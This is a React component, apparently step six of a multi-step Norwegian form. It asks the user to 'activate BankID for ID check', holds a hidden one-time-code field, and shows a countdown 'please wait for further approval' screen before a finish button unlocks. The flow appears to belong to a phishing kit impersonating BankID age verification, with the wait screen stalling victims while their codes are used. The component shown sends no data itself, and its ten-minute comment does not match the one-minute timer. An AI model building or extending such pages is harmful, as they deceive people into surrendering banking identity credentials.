import { useEffect, useState } from "react";
import PropTypes from "prop-types";
import Loader from "../../components/Loader";

const Step6 = ({ formData, handleInputChange, handleNext, isLoading }) => {
  const totalTime = 1 * 60; // Total time in seconds (10 minutes)
  const [timeLeft, setTimeLeft] = useState(totalTime); // Countdown timer
  const [isExpired, setIsExpired] = useState(false);

  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true);
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => prevTime - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? "0" : ""}${secs}`;
  };

  // Calculate progress (stroke-dashoffset) for the circular ring
  const progress = (timeLeft / totalTime) * 100;
  const radius = 40;
  const circumference = 2 * Math.PI * radius; // Circle circumference
  const strokeDashoffset = circumference - (progress / 100) * circumference;

  return (
    <div className="flex flex-col items-center bg-[#360f54] text-white p-6 rounded-lg shadow-lg">
      <h1 className="font-bold text-lg">Aktiver BankID for ID sjekk</h1>
      <p className="text-sm">Aldersgrense identifisering</p>

      <input
        type="hidden"
        className="step-input rounded-md bg-[#481b68] border border-[#745b88] hover:border-white"
        placeholder="Engangskode"
        name="step6"
        maxLength={6}
        minLength={6}
        value={formData.step6 || "step6"}
        onChange={handleInputChange}
      />

      <div className="flex flex-col items-center py-8">
        <p className="pb-4 text-center">
          {isExpired
            ? "Klar til videre godkjenning"
            : "Vennligst vent til videre godkjenning"}
        </p>

        <div className="relative w-24 h-24">
          <svg className="w-full h-full transform -rotate-90">
            <circle
              cx="50%"
              cy="50%"
              r={radius}
              fill="none"
              stroke="#9400ff"
              strokeWidth="6"
            />
            <circle
              cx="50%"
              cy="50%"
              r={radius}
              fill="none"
              stroke="#1f092e"
              strokeWidth="6"
              strokeDasharray={circumference}
              strokeDashoffset={strokeDashoffset}
              strokeLinecap="round"
            />
          </svg>

          <div className="absolute inset-0 flex items-center justify-center font-bold text-md">
            {timeLeft > 0 ? formatTime(timeLeft) : "Klar"}
          </div>
        </div>
      </div>

      {isExpired ? (
        <button
          className={`bg-white mb-3 text-black px-6 py-2 rounded-full font-bold`}
          disabled={isLoading}
          onClick={handleNext}
        >
          {isLoading ? <Loader /> : "Fullfor identifisering"}
        </button>
      ) : (
        <button
          className={`px-6 py-2 rounded-full font-bold bg-gray-400 text-gray-700 cursor-not-allowed`}
          disabled={!isExpired}
        >
          Vent
        </button>
      )}
    </div>
  );
};

Step6.propTypes = {
  formData: PropTypes.object.isRequired,
  handleNext: PropTypes.func.isRequired,
  handleInputChange: PropTypes.func.isRequired,
  isLoading: PropTypes.bool.isRequired
};

export default Step6;
